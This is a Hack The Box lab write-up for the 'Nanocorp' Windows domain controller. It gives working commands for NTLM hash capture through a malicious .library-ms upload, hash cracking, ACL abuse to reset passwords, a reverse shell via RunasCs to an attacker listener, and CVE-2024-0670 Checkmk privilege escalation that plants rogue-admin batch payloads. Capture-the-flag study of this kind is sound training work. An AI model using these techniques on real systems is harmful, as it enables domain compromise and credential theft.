# HTB Write-Up: Nanocorp

| Field      | Details                                                                  |
|------------|--------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines)                      |
| Difficulty | Medium                                                                   |
| OS         | Windows                                                                  |
| Domain     | `nanocorp.htb`                                                           |
| Author     | Babayev                                                                  |
| Date       | June 23, 2026                                                            |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Initial Foothold — NTLM Capture via Malicious Library File](#2-initial-foothold--ntlm-capture-via-malicious-library-file)
3. [Lateral Movement — BloodHound & Group Self-Add](#3-lateral-movement--bloodhound--group-self-add)
4. [Foothold Escalation — monitoring_svc via WinRM](#4-foothold-escalation--monitoring_svc-via-winrm)
5. [Privilege Escalation — Checkmk Agent (CVE-2024-0670)](#5-privilege-escalation--checkmk-agent-cve-2024-0670)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Initial port scanning was performed with Nmap:

```bash
nmap -A 10.129.243.199
```

**Open Ports:**

| Port  | Service          | Details                                              |
|-------|-------------------|-------------------------------------------------------|
| 53    | DNS               | Simple DNS Plus                                       |
| 80    | HTTP              | Apache 2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12         |
| 88    | Kerberos          | Microsoft Windows Kerberos                            |
| 135   | MSRPC             | Microsoft Windows RPC                                 |
| 139   | NetBIOS           | netbios-ssn                                           |
| 389/3268 | LDAP           | Domain: `nanocorp.htb`                                |
| 445   | SMB               | microsoft-ds                                          |
| 464   | kpasswd5          |                                                        |
| 593   | RPC over HTTP     |                                                        |
| 636/3269 | LDAPS          |                                                        |
| 5986  | WinRM over SSL    | Cert CN: `dc01.nanocorp.htb`                           |

The host is a **Domain Controller** (`DC01.nanocorp.htb`) running Windows Server 2022, domain `nanocorp.htb`. A notable **6h58m clock skew** was flagged by Nmap — a recurring issue that later required correcting with `ntpdate` before Kerberos authentication would succeed.

Anonymous LDAP and null-session SMB were tested and shut down:

```bash
ldapsearch -H ldap://nanocorp.htb -x -b "dc=nanocorp,dc=htb"
# Operations error — anonymous bind not permitted

nxc smb 10.129.243.199 -u guest -p '' --shares
# STATUS_ACCOUNT_DISABLED
```

The web service on port 80 redirected to `http://nanocorp.htb/`. An "Apply" button on the site's About page led to a second vhost, `http://hire.nanocorp.htb/`, which hosted a **zip file upload** feature — the entry point for the initial foothold.

---

## 2. Initial Foothold — NTLM Capture via Malicious Library File

The upload form on `hire.nanocorp.htb` accepted zip files, presenting an opportunity to embed a malicious `.library-ms` file — a Windows Library Description file that, when extracted and rendered by Explorer, forces an outbound SMB authentication attempt to an attacker-controlled host.

A PoC script was used to generate the library file and package it into a zip:

```bash
python3 PoC.py test 10.10.14.249
# [+] File test.library-ms created successfully.
```

The resulting `exploit.zip` was uploaded via the hire portal. With `Responder` listening, an internal account's NTLMv2 hash was captured as soon as the file was processed server-side:

```bash
sudo responder -I tun0
```

```
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:38e9efafd4bca8b0:...
```

The captured hash was cracked offline with John the Ripper against `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=netntlmv2
```

**Result:**

```
dksehdgh712!@#   (web_svc)
```

Credentials recovered: `nanocorp.htb\web_svc : dksehdgh712!@#`

---

## 3. Lateral Movement — BloodHound & Group Self-Add

With `web_svc` credentials in hand, BloodHound was used to map the domain's ACL graph:

```bash
bloodhound-python -ns 10.129.243.199 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -c All --zip
```

**Key finding:**

- `web_svc` has the **ability to add itself** to the **`IT_SUPPORT`** security group.
- Members of `IT_SUPPORT` (via group delegation) have the right to **change `monitoring_svc`'s password without knowing the current one**.

This is a short, clean privilege chain: `web_svc → IT_SUPPORT (self-add) → monitoring_svc (password reset)`.

### 3.1 — Self-Add to IT_SUPPORT

```bash
bloodyAD --host 10.129.35.214 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'web_svc'
```

```
[+] web_svc added to IT_SUPPORT
```

### 3.2 — Password Reset: web_svc → monitoring_svc

```bash
bloodyAD --host 10.129.35.214 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Aliska123!'
```

```
[+] Password changed successfully!
```

---

## 4. Foothold Escalation — monitoring_svc via WinRM

A Kerberos TGT was requested for `monitoring_svc` using the new password:

```bash
impacket-getTGT nanocorp.htb/monitoring_svc:'Aliska123!' -dc-ip 10.129.35.214
```

This initially failed due to clock skew between the attack box and the DC:

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Resolved by syncing time against the DC:

```bash
sudo ntpdate 10.129.35.214
```

Re-running `getTGT` succeeded, producing a `.ccache` file:

```bash
export KRB5CCNAME=monitoring_svc.ccache
klist
```

```
Default principal: monitoring_svc@NANOCORP.HTB
Service principal: krbtgt/NANOCORP.HTB@NANOCORP.HTB
```

A Kerberos-authenticated Evil-WinRM session was then opened against the DC using the ccache ticket:

```bash
evil-winrm -i DC01.nanocorp.htb -K monitoring_svc.ccache -r NANOCORP.HTB --ssl
```

```
*Evil-WinRM* PS C:\Users\monitoring_svc\Documents> whoami
nanocorp\monitoring_svc
```

User flag retrieved from `C:\Users\monitoring_svc\Desktop\user.txt`.

> **Note:** When using `-K` (ccache) with Evil-WinRM, the realm must be passed explicitly via `-r REALM.HTB` — not a path to `krb5.conf` — and the target should be addressed by its real AD hostname (`DC01.nanocorp.htb`), not a vanity vhost like `hire.nanocorp.htb`, since Kerberos SPN lookups depend on the actual AD-registered DNS name.

---

## 5. Privilege Escalation — Checkmk Agent (CVE-2024-0670)

### 5.1 — Discovering the Checkmk Agent

Local enumeration from the `monitoring_svc` shell revealed a service listening only on localhost, invisible to the original external Nmap scan:

```powershell
netstat -ano
```

```
TCP 0.0.0.0:6556 0.0.0.0:0 LISTENING 4056
```

Talking to the port directly via a raw TCP client identified the service and its version:

```powershell
$client = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 6556)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
while (($line = $reader.ReadLine()) -ne $null) { $line }
```

```
<<<check_mk>>>
Version: 2.1.0p10
AgentOS: windows
Hostname: DC01
```

Checkmk Agent 2.1.0p10 is vulnerable to **CVE-2024-0670**, a local privilege escalation issue: the agent's repair/upgrade flow executes batch scripts dropped into `C:\Windows\Temp` (named `cmk_all_<pid>_1.cmd`) with **SYSTEM** privileges, and that directory is world-writable.

### 5.2 — Identifying the Vulnerable MSI Package

The install directory itself (`C:\Program Files (x86)\checkmk\service`) was not readable by `monitoring_svc`, but the corresponding MSI package used by Windows Installer for repairs was locatable in the installer cache:

```powershell
dir C:\Windows\Installer\
```

The Checkmk agent's MSI was identified by file size (~12 MB) and install date:

```
03/28/2025  03:08 PM    12,637,696   1e6f2.msi
```

### 5.3 — Staging the Malicious Payload

A batch payload was crafted to create a new local administrator account:

```cmd
net user adminuser Password@123! /add
net localgroup Administrators adminuser /add
```

> **Gotcha:** the file must be saved with **Windows CRLF line endings**. A version created via a Linux heredoc (`cat << EOF`) defaults to Unix LF endings, which caused the script to silently fail when executed by Checkmk's repair routine — files disappeared (indicating execution attempt) but the user was never created. Rebuilding the file explicitly with CRLF terminators resolved it:
> ```bash
> printf 'net user adminuser Password@123! /add\r\nnet localgroup Administrators adminuser /add\r\n' > pwn.cmd
> ```

The payload was uploaded and sprayed into `C:\Windows\Temp` across the full range of possible PIDs, with the read-only flag set on each copy to prevent Checkmk's own legitimate repair files from overwriting them mid-race:

```powershell
upload pwn.cmd C:\Temp\pwn.cmd

1..10000 | foreach {
  Copy C:\Temp\pwn.cmd C:\Windows\Temp\cmk_all_${_}_1.cmd
  Set-ItemProperty -Path C:\Windows\Temp\cmk_all_${_}_1.cmd -Name IsReadOnly -Value $true
}
```

### 5.4 — Reaching an Interactive Session

Triggering the vulnerable `msiexec /fa` repair requires an **interactive desktop session** — it does not work from a non-interactive WinRM shell. `RunasCs.exe` was used to enumerate active sessions:

```powershell
upload RunasCs.exe
.\RunasCs.exe x x qwinsta -l 9
```

```
SESSIONNAME       USERNAME    ID  STATE   TYPE   DEVICE
console                        1  Conn
                  web_svc      2  Disc
```

`web_svc`'s credentials (cracked earlier from the NTLM capture) were reused to spawn a reverse shell directly inside that user's existing session:

```bash
# Kali — start listener
nc -nvlp 4444
```

```powershell
# Target — spawn shell in web_svc's session
.\RunasCs.exe web_svc 'dksehdgh712!@#' cmd.exe -r 10.10.16.X:4444 -l 2
```

```
nc -nvlp 4444
connect to [10.10.16.X] from (UNKNOWN) ...
C:\Windows\system32>whoami
nanocorp\web_svc
```

### 5.5 — Triggering the Repair

From the interactive `web_svc` shell (a plain `cmd.exe`, requiring PowerShell to be invoked explicitly for the spray pipeline syntax), the payload was re-staged and the MSI repair was launched:

```cmd
powershell -Command "1..10000 | foreach { Copy C:\Temp\pwn.cmd C:\Windows\Temp\cmk_all_${_}_1.cmd; Set-ItemProperty -Path C:\Windows\Temp\cmk_all_${_}_1.cmd -Name IsReadOnly -Value $true }"

msiexec /fa C:\Windows\Installer\1e6f2.msi
```

The repair operation picked up and executed the planted scripts as **NT AUTHORITY\SYSTEM**, creating the rogue administrator account.

### 5.6 — Confirming and Using the New Admin Account

```bash
netexec ldap nanocorp.htb -u adminuser -p 'Password@123!'
```

```
LDAP   DC01   [+] nanocorp.htb\adminuser:Password@123!
```

```bash
evil-winrm -i nanocorp.htb -u adminuser -p 'Password@123!' -S
```

```powershell
*Evil-WinRM* PS C:\Users\adminuser\Documents> whoami
nanocorp\adminuser
*Evil-WinRM* PS C:\Users\adminuser\Documents> type C:\Users\Administrator\Desktop\root.txt
```

**Root flag retrieved from `\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | Nmap | DC identified, `nanocorp.htb`, Windows Server 2022; web vhost `hire.nanocorp.htb` discovered |
| Initial Foothold | Malicious `.library-ms` in zip upload + Responder | NTLMv2 hash for `web_svc` captured and cracked (`dksehdgh712!@#`) |
| Lateral (1) | BloodHound — self-add to `IT_SUPPORT` | `web_svc` gained group-delegated password-reset rights |
| Lateral (2) | bloodyAD — password reset | `monitoring_svc` password set to known value |
| Shell Access | Kerberos ccache + Evil-WinRM | Shell as `monitoring_svc`; user flag retrieved |
| Local Enum | `netstat` + raw TCP probe | Checkmk Agent 2.1.0p10 found on `127.0.0.1:6556` |
| Privesc | CVE-2024-0670 — Checkmk MSI repair temp-file hijack | SYSTEM-level execution via `msiexec /fa`; rogue admin created |
| Session Pivot | `RunasCs.exe` into `web_svc`'s interactive session | Required to trigger the vulnerable repair path |
| Root | Evil-WinRM as `adminuser` | `root.txt` from `\Administrator\Desktop` |

### Key Takeaways

- **File upload features that process archives are a classic NTLM-capture vector.** A `.library-ms` (or similarly behaving file type) embedded in an uploaded zip can force outbound SMB authentication the moment it's extracted or previewed server-side — no code execution required, just a listening Responder instance.

- **BloodHound surfaces self-service privilege chains, not just "obvious" admin paths.** A user's ability to add itself to a group, combined with that group's delegated rights over another account, is easy to miss without graph-based ACL analysis but trivial to abuse once found.

- **Kerberos tooling is extremely clock-sensitive.** Both `impacket-getTGT` and Evil-WinRM's Kerberos auth failed outright until `ntpdate` corrected skew against the DC — a near-mandatory first troubleshooting step on any HTB AD box using ticket-based auth.

- **CVE-2024-0670 is a textbook "world-writable directory + privileged scheduled/triggered execution" bug.** Checkmk's repair operation trusts anything matching its expected filename pattern in `C:\Windows\Temp`, without verifying who placed it there. The read-only attribute is key to winning the race against the legitimate file being restored mid-repair.

- **The vulnerable code path required an interactive desktop session, not just account impersonation.** `RunasCs.exe -l <session_id>` to land inside `web_svc`'s actual disconnected RDP session was the difference between `msiexec /fa` doing nothing over WinRM and successfully triggering the SYSTEM-level execution.

- **Cross-platform payload transfer needs explicit line-ending discipline.** A batch file built on Linux with default LF endings caused a silent failure — the temp files were consumed (suggesting execution was attempted) but the payload's commands never ran. Explicit CRLF construction (`printf '...\r\n'`) resolved it instantly.
